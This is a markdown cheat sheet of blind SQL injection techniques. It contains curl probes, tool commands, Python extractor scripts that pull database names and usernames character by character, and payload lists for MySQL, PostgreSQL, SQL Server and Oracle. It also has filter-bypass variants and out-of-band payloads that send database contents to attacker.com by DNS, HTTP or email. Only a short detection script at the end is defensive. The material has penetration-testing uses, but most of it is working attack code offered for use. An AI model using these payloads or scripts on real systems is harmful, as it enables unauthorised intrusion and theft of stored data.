# Blind SQL Injection Tools Collection

Specialized tools and techniques for detecting and exploiting blind SQL injection vulnerabilities.

## Manual Testing Techniques

### Boolean-Based Blind Detection
```bash
# Truth condition testing
curl "http://target.com/page?id=1' AND 1=1--"  # Should return normal page
curl "http://target.com/page?id=1' AND 1=2--"  # Should return different/error page

# String length detection
curl "http://target.com/page?id=1' AND LENGTH(database())=8--"

# Character-by-character extraction
curl "http://target.com/page?id=1' AND ASCII(SUBSTRING(database(),1,1))=109--"
```

### Time-Based Blind Detection
```bash
# MySQL time delays
curl "http://target.com/page?id=1' AND SLEEP(5)--"

# PostgreSQL time delays
curl "http://target.com/page?id=1' AND pg_sleep(5)--"

# SQL Server time delays
curl "http://target.com/page?id=1'; WAITFOR DELAY '00:00:05'--"

# Oracle time delays
curl "http://target.com/page?id=1' AND (SELECT COUNT(*) FROM ALL_USERS)>0 AND DBMS_LOCK.SLEEP(5) IS NULL--"
```

## BApp - Blind SQL Injection Tool

### Installation and Setup
```bash
# Download from GitHub
git clone https://github.com/lanjelot/bapp.git
cd bapp
pip install -r requirements.txt

# Basic usage
python bapp.py -u "http://target.com/page?id=1" -p id
```

### Advanced BApp Usage
```bash
# Custom payloads
python bapp.py -u "http://target.com/page?id=1" -p id --payload-file custom_payloads.txt

# Time-based detection
python bapp.py -u "http://target.com/page?id=1" -p id --time-based --delay 5

# Boolean-based detection
python bapp.py -u "http://target.com/page?id=1" -p id --boolean-based

# Database enumeration
python bapp.py -u "http://target.com/page?id=1" -p id --enumerate --db-type mysql
```

## BSQLInjector - Binary Search SQL Injector

### Installation
```bash
git clone https://github.com/TimGBro/BSQLInjector.git
cd BSQLInjector
chmod +x bsqlinjector.py
```

### Binary Search Extraction
```bash
# Database name extraction
python bsqlinjector.py -u "http://target.com/page?id=1" --extract-db

# Table extraction
python bsqlinjector.py -u "http://target.com/page?id=1" --extract-tables

# Column extraction
python bsqlinjector.py -u "http://target.com/page?id=1" --extract-columns -t users

# Data extraction
python bsqlinjector.py -u "http://target.com/page?id=1" --extract-data -t users -c username,password
```

## Blind SQL Automation Scripts

### Boolean-Based Extractor Script
```python
#!/usr/bin/env python3
import requests
import string
import time

def boolean_blind_extract(url, injection_point, query):
    """Extract data using boolean-based blind SQL injection"""
    result = ""
    position = 1
    
    while True:
        found = False
        # Test each printable ASCII character
        for char in string.printable:
            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={ord(char)}--"
            test_url = url.replace(injection_point, injection_point + payload)
            
            response = requests.get(test_url)
            
            # Adjust this condition based on application behavior
            if "Welcome" in response.text and response.status_code == 200:
                result += char
                print(f"Found character: {char} (Position: {position})")
                found = True
                break
                
        if not found:
            break
            
        position += 1
        time.sleep(0.5)  # Avoid overwhelming the server
    
    return result

# Usage example
url = "http://target.com/page?id=1"
database_name = boolean_blind_extract(url, "1", "SELECT database()")
print(f"Database name: {database_name}")
```

### Time-Based Extractor Script
```python
#!/usr/bin/env python3
import requests
import string
import time

def time_blind_extract(url, injection_point, query, delay=5):
    """Extract data using time-based blind SQL injection"""
    result = ""
    position = 1
    
    while True:
        found = False
        for char in string.printable:
            payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ord(char)},SLEEP({delay}),0)--"
            test_url = url.replace(injection_point, injection_point + payload)
            
            start_time = time.time()
            try:
                response = requests.get(test_url, timeout=delay+2)
                elapsed_time = time.time() - start_time
                
                if elapsed_time >= delay:
                    result += char
                    print(f"Found character: {char} (Position: {position})")
                    found = True
                    break
            except requests.Timeout:
                result += char
                print(f"Found character: {char} (Position: {position}) - Timeout")
                found = True
                break
                
        if not found:
            break
            
        position += 1
        time.sleep(1)  # Rate limiting
    
    return result

# Usage example
url = "http://target.com/page?id=1"
username = time_blind_extract(url, "1", "SELECT username FROM users LIMIT 1")
print(f"Username: {username}")
```

## Blind SQL Injection Payloads

### MySQL Blind Payloads
```sql
-- Boolean-based
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' AND (SELECT LENGTH(database()))=N--
' AND ASCII(SUBSTRING(database(),1,1))=N--

-- Time-based
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM dual WHERE database()='target_db')--

-- Error-based blind
' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### PostgreSQL Blind Payloads
```sql
-- Boolean-based
' AND (SELECT COUNT(*) FROM pg_tables)>0--
' AND LENGTH((SELECT current_database()))=N--

-- Time-based
' AND pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Error-based blind
' AND (SELECT CAST((SELECT current_database()) AS int))--
```

### SQL Server Blind Payloads
```sql
-- Boolean-based
' AND (SELECT COUNT(*) FROM sys.tables)>0--
' AND LEN(db_name())=N--

-- Time-based
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT CASE WHEN (1=1) THEN 'A' ELSE (SELECT 'A' UNION SELECT 'B') END)='A'; WAITFOR DELAY '00:00:05'--

-- Error-based blind
' AND (SELECT CAST((SELECT db_name()) AS int))--
```

### Oracle Blind Payloads
```sql
-- Boolean-based
' AND (SELECT COUNT(*) FROM all_tables)>0--
' AND LENGTH((SELECT user FROM dual))=N--

-- Time-based
' AND (SELECT COUNT(*) FROM all_users WHERE ROWNUM<=1 AND DBMS_LOCK.SLEEP(5) IS NULL)>0--

-- Error-based blind
' AND (SELECT CAST((SELECT user FROM dual) AS number) FROM dual)=1--
```

## Advanced Techniques

### Out-of-Band (OOB) Extraction
```sql
-- DNS exfiltration (MySQL/Windows)
' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share')))--

-- HTTP exfiltration
' AND (SELECT LOAD_FILE(CONCAT('http://attacker.com/',database())))--

-- Email exfiltration (if configured)
' AND (SELECT UTL_MAIL.SEND('attacker@example.com','data',database()) FROM dual)--
```

### Bypass Techniques
```sql
-- Comment variations
--
#
/**/
--+
-- -

-- Space alternatives
/**/
+
%20
%09
%0a
%0d

-- Quote alternatives
'
"
`
%27
%22
%60

-- Logic operators
AND
&&
OR
||
```

## Blind SQL Injection Detection Tools

### Automated Detection
```bash
# Using sqlmap for blind detection
sqlmap -u "http://target.com/page?id=1" --technique=B --level=5 --risk=3

# Using commix for command injection
commix --url="http://target.com/page?id=1" --level=3

# Using NoSQLMap for NoSQL blind injection
python nosqlmap.py -t "http://target.com/api" -p query --technique blind-time
```

### Custom Detection Script
```python
#!/usr/bin/env python3
import requests
import time

def detect_blind_sql(url, param, value):
    """Detect blind SQL injection vulnerabilities"""
    
    # Test payloads
    payloads = [
        "' AND 1=1--",
        "' AND 1=2--", 
        "' AND SLEEP(5)--",
        "' OR '1'='1",
        "' OR '1'='2",
        "1' AND '1'='1",
        "1' AND '1'='2"
    ]
    
    baseline_response = requests.get(f"{url}?{param}={value}")
    baseline_time = baseline_response.elapsed.total_seconds()
    
    vulnerabilities = []
    
    for payload in payloads:
        test_url = f"{url}?{param}={value}{payload}"
        start_time = time.time()
        
        try:
            response = requests.get(test_url, timeout=10)
            response_time = time.time() - start_time
            
            # Check for time-based injection
            if response_time > 5:
                vulnerabilities.append(f"Time-based blind SQL injection detected with payload: {payload}")
            
            # Check for boolean-based injection
            if response.text != baseline_response.text:
                vulnerabilities.append(f"Boolean-based blind SQL injection detected with payload: {payload}")
                
        except requests.Timeout:
            vulnerabilities.append(f"Potential time-based blind SQL injection (timeout) with payload: {payload}")
    
    return vulnerabilities

# Usage
url = "http://target.com/page"
vulnerabilities = detect_blind_sql(url, "id", "1")
for vuln in vulnerabilities:
    print(vuln)
```

Comprehensive toolkit for identifying and exploiting blind SQL injection vulnerabilities across multiple database platforms.
